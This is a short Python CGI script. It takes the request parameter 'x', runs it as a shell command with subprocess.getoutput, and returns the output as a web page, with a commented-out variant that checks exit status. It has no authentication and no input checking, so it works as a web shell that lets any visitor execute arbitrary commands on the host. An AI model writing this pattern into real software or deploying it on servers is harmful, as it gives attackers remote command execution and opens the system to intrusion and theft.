#!/usr/bin/python3

print("content-type: text/html")
print()

import subprocess as sb
import cgi


form = cgi.FieldStorage()
cmd = form.getvalue("x")
y = sb.getoutput(cmd)
print(y)
#x = sb.getstatusoutput(cmd)


#status = x[0]
#output = x[1]

#if status == 0:
#    print(output)

#else:
#    print("Command Failure..")
